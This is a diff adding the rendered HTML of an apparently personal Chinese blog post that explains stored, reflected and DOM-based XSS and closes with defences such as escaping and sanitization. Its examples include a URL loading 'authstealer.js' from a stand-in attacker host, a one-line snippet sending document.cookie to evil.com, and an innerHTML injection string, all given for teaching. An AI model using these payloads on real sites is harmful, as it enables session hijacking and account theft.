@@ -1,0 +1,253 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XSS跨站脚本攻击 | LITREILY</title><meta name="author" content="litreily,707922098@qq.com"><meta name="copyright" content="litreily"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="近期遇到一堆 Stored XSS vulnerability 问题，即存储型跨站脚本漏洞，所以有必要学习一下XSS相关的知识。 XSS简介XSS是跨站脚本Cross-Site Scripting的简写，至于为什么不是CSS，相信大家很容易猜到，是为了避免与前端的层叠样式表Cascading Style Sheets重名。 XSS涉及三个要素：一个站点，攻击者和受害者。攻击者通过某站点的漏洞注入脚">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站脚本攻击">
+<meta property="og:url" content="https://www.litreily.top/2019/02/14/XSS/index.html">
+<meta property="og:site_name" content="LITREILY">
+<meta property="og:description" content="近期遇到一堆 Stored XSS vulnerability 问题，即存储型跨站脚本漏洞，所以有必要学习一下XSS相关的知识。 XSS简介XSS是跨站脚本Cross-Site Scripting的简写，至于为什么不是CSS，相信大家很容易猜到，是为了避免与前端的层叠样式表Cascading Style Sheets重名。 XSS涉及三个要素：一个站点，攻击者和受害者。攻击者通过某站点的漏洞注入脚">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.litreily.top/img/butterfly-icon.png">
+<meta property="article:published_time" content="2019-02-14T03:14:20.000Z">
+<meta property="article:modified_time" content="2026-05-14T01:37:35.157Z">
+<meta property="article:author" content="litreily">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.litreily.top/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XSS跨站脚本攻击",
+  "url": "https://www.litreily.top/2019/02/14/XSS/",
+  "image": "https://www.litreily.top/img/butterfly-icon.png",
+  "datePublished": "2019-02-14T03:14:20.000Z",
+  "dateModified": "2026-05-14T01:37:35.157Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "litreily",
+      "url": "https://www.litreily.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.litreily.top/2019/02/14/XSS/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS跨站脚本攻击',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="LITREILY" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">117</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">LITREILY</span></a><a class="nav-page-title" href="/"><span class="site-name">XSS跨站脚本攻击</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XSS跨站脚本攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2019-02-14T03:14:20.000Z" title="Created 2019-02-14 11:14:20">2019-02-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-05-14T01:37:35.157Z" title="Updated 2026-05-14 09:37:35">2026-05-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Network/">Network</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Network/Security/">Security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>近期遇到一堆 Stored XSS vulnerability 问题，即存储型跨站脚本漏洞，所以有必要学习一下XSS相关的知识。</p>
+<h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p><code>XSS</code>是跨站脚本<code>Cross-Site Scripting</code>的简写，至于为什么不是<code>CSS</code>，相信大家很容易猜到，是为了避免与前端的层叠样式表<code>Cascading Style Sheets</code>重名。</p>
+<p><code>XSS</code>涉及三个要素：一个站点，攻击者和受害者。攻击者通过某站点的漏洞注入脚本到该站点，受害者在使用浏览器访问该站点时就可能遭受<code>XSS</code>攻击。</p>
+<p>脚本类型不限于<code>javascript</code>, 也可以是其它脚本，如<code>VBScript</code>, <code>ActiveX</code> 和 <code>flash</code>等，但主要还是以<code>javascript</code>为主。</p>
+<span id="more"></span>
+
+<h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><p><code>XSS</code>的分类貌似没有固定标准，但约定俗成的被分为持久化的存储型XSS和非持久化的反射型XSS。</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p><code>Stored XSS</code>, 持久化的，也就是说只要用户在浏览器打开了这个站点就会执行攻击者注入的脚本。此类<code>XSS</code>要求攻击者将脚本存储至站点服务器。</p>
+<p>举个例子，很多论坛都有评论功能，攻击者可以通过评论把脚本信息存入站点服务器，如果站点未加过滤和编码，直接将脚本信息当做普通评论存入数据库，其他人访问该站点时就会执行该脚本。</p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><code>Reflected XSS</code>, 非持久化的，需要用户打开站点后执行某些操作方能触发，比如点击某个链接，然后触发执行攻击者注入的脚本，脚本可以是一个代码段，也可以是指向攻击者提供的脚本链接。利用站点易受攻击的漏洞，就可以让用户执行任意脚本。</p>
+<p>此类<code>XSS</code>攻击者通常使用邮件或是中间站点发送带有脚本的链接给用户，而链接往往看起来很正常，带有正规站点的域名，脚本部分可能使用16进制编码，不容易看出端倪。</p>
+<p>下面引用的<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent">维基百科</a>的例子:</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-comment"># 攻击者提供的链接，在访问bobssite.org的搜索功能时执行脚本</span><br><span class="hljs-string">http://bobssite.org/search?q=&lt;script%20type=&#x27;application/javascript&#x27;&gt;alert(&#x27;xss&#x27;);&lt;/script&gt;</span><br><br><span class="hljs-comment"># 下面的链接触发后会执行攻击者服务器中的脚本authstealer.js</span><br><span class="hljs-string">http://bobssite.org/search?q=puppies&lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;&lt;/script&gt;</span><br><br><span class="hljs-comment"># 下面是经过预先编码后的链接</span><br><span class="hljs-string">http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM-Based XSS"></a>DOM-Based XSS</h3><p>基于DOM(Document Object Model)的<code>XSS</code>与以上两种不同的是，它完全发生在客户端，与服务器端无关，但同时又可以算是反射型<code>XSS</code>的子集，因为它也需要一定的交互才能触发。</p>
+<p><code>DOM-Based XSS</code>原理：站点获取用户输入数据，然后通过站点自带的js代码修改<code>DOM</code>结构，如果输入的数据携带有恶意代码，就可能导致<code>XSS</code>攻击。</p>
+<p>举个例子，以下代码用来显示访问链接（如：<code>http://www.example.com?name=test</code>）中携带的用户名</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> namePos=<span class="hljs-variable language_">document</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;name=&quot;</span>)<br><span class="hljs-keyword">if</span> (namePos != -<span class="hljs-number">1</span>)<br>&#123;<br>    <span class="hljs-keyword">var</span> name = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;span&#x27;</span>);<br>    name.<span class="hljs-property">innerHTML</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">substring</span>(namePos, <span class="hljs-variable language_">document</span>.<span class="hljs-property">URL</span>.<span class="hljs-property">length</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如果用户名包含了恶意代码，如<code>&lt;/span&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;span&gt;</code>，这就会在原先想要生成的<code>span</code>标签后加入攻击者的脚本并执行。</p>
+<h2 id="XSS攻击的危害与防范"><a href="#XSS攻击的危害与防范" class="headerlink" title="XSS攻击的危害与防范"></a>XSS攻击的危害与防范</h2><p>通过<code>XSS</code>攻击，攻击者可以获取用户的敏感信息，例如在用户完全不知情的情况下拿到用户登录后的<code>Cookie</code>信息，之后通过会话劫持冒充真实用户访问网站，和盗号一样，攻击者可以修改账户密码，获取账户内的私人信息甚至财产。更近一步，如果攻击者用此方法获取到了站点管理员的账户，那么将可能拿到站点的控制权。</p>
+<p>具体例子可以参考<a target="_blank" rel="noopener" href="https://www.acunetix.com/websitesecurity/cross-site-scripting/">Cross-site Scripting (XSS) Attack</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;http://evil.com/?cookie=&quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span><br></code></pre></td></tr></table></figure>
+
+<p>那么<code>XSS</code>该如何防范呢？</p>
+<ol>
+<li><p>常用办法是进行特殊字符替换，对于所有的用户输入，需要进行过滤检查，对于上下文输出，将<code>&lt;&gt;/\#$&amp;?&#39;&quot;</code>等字符编码转义为对应的<code>html</code>码，这也是我们当前使用最多的方案；</p>
+</li>
+<li><p>对于不信任的用户输入，可以使用专门的机制（如：<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/HTML_sanitization">HTML sanitization</a>）去辨别输入的有效性。</p>
+</li>
+<li><p>而对于<code>Cookie</code>，为了防止攻击者使用窃取的<code>Cookie</code>进行访问，可以通过绑定用户<code>IP</code>和<code>Cookie</code>，仅允许指定<code>IP</code>的用户使用特定<code>Cookie</code>才有效。</p>
+</li>
+</ol>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文简述了<code>XSS</code>的概念，介绍了存储型、反射型和<code>DOM-Based</code>三种<code>XSS</code>攻击手段，并予以举例说明，最后简单介绍了<code>XSS</code>危害及其常用防范手段。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.acunetix.com/websitesecurity/cross-site-scripting/">Cross-site Scripting (XSS) Attack</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cross-site_scripting">Wikipedia - Cross-site scripting</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://www.litreily.top">litreily</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://www.litreily.top/2019/02/14/XSS/">https://www.litreily.top/2019/02/14/XSS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/xss/">xss</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2019/02/17/mount/" title="Ubuntu开机自动挂载Windows系统中的磁盘分区"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Ubuntu开机自动挂载Windows系统中的磁盘分区</div></div><div class="info-2"><div class="info-item-1">本人电脑装有ubuntu和windows双系统，有时候需要在ubuntu下使用windows系统下的文件，每次手动挂载的话很麻烦，所以想让它开机自动挂载常用的windows磁盘分区。 查看分区在挂载windows磁盘前，需要知道每个磁盘的路径或UUID，此时主要依靠fdisk和blkid两个指令，前一个指令获取分区信息，后一个指令获取Block device块设备的属性。 123456$ sudo blkid/dev/sda1: LABEL=&quot;Win10&quot; UUID=&quot;C4A0E65EA0E65708&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;6190c592-01&quot;/dev/sda2: UUID=&quot;AE3C137D3C133FAF&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;6190c592-02&quot;/dev/sdb1: LABEL=&quot;Apps&quot; UUID=&quot;0000678400004823&quot; T...</div></div></div></a><a class="pagination-related" href="/2019/01/22/highcharts/" title="Python之MongoDB数据分析及其Highcharts可视化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Python之MongoDB数据分析及其Highcharts可视化</div></div><div class="info-2"><div class="info-item-1">近期使用requests把内部bugziila上的bug数据爬取了一遍，并存入了本地的MongoDB数据库，想着对数据做些简单的可视化处理，将所有产品的bug数做一个统计和可视化，于是便有了这篇简短的文章。   MongoDB中的数据存储格式之前爬取数据后，存入MongoDB的数据格式如下，而我要分析的仅仅是其中的metadata.Product 1234567891011121314151617181920212223242526272829&#123;    &quot;_id&quot; : ObjectId(&quot;5c3ea1d3fbf7884588041acc&quot;),    &quot;id&quot; : 1,    &quot;title&quot; : &quot;\&quot;Show interface dot11radio advanced\&quot; command doesn&#x27;t work&quot;,    &quot;metadata&quot; : &#123;        &quot;Status&quot; : &q...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">litreily</div><div class="author-info-description">simple life</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">117</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Litreily"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://www.litreily.top/notes/" target="_blank" title="Notes"><i class="fas fa-sticky-note" style="color: #e8a618;"></i></a><a class="social-icon" href="mailto:litreily@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">XSS简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">XSS类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.1.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">2.2.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-Based-XSS"><span class="toc-number">2.3.</span> <span class="toc-text">DOM-Based XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E7%9A%84%E5%8D%B1%E5%AE%B3%E4%B8%8E%E9%98%B2%E8%8C%83"><span class="toc-number">3.</span> <span class="toc-text">XSS攻击的危害与防范</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/19/android10-ota/" title="RK3399 Android 10 系统OTA升级失败问题">RK3399 Android 10 系统OTA升级失败问题</a><time datetime="2024-09-19T08:28:06.000Z" title="Created 2024-09-19 16:28:06">2024-09-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/31/rk3399-wol/" title="rk3399 ubuntu 休眠唤醒功能">rk3399 ubuntu 休眠唤醒功能</a><time datetime="2024-05-31T10:31:47.000Z" title="Created 2024-05-31 18:31:47">2024-05-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/05/rk32-new-part/" title="RK3288 Android6 新增分区">RK3288 Android6 新增分区</a><time datetime="2024-02-05T08:38:12.000Z" title="Created 2024-02-05 16:38:12">2024-02-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/10/rk32-disable-wifi/" title="RK3288 Android6 禁用 wifi">RK3288 Android6 禁用 wifi</a><time datetime="2024-01-10T08:55:19.000Z" title="Created 2024-01-10 16:55:19">2024-01-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/06/isolcpus/" title="RK3399 Android10 bind cpu with isolcpus">RK3399 Android10 bind cpu with isolcpus</a><time datetime="2023-12-06T07:29:46.000Z" title="Created 2023-12-06 15:29:46">2023-12-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By litreily</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 5.4.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: '1ecKy4yk4u1R7C4tScKbnyq9-gzGzoHsz',
+      appKey: 'uvA3xgqNW3q8TGR483lxXcpB',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine@1.5.3/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
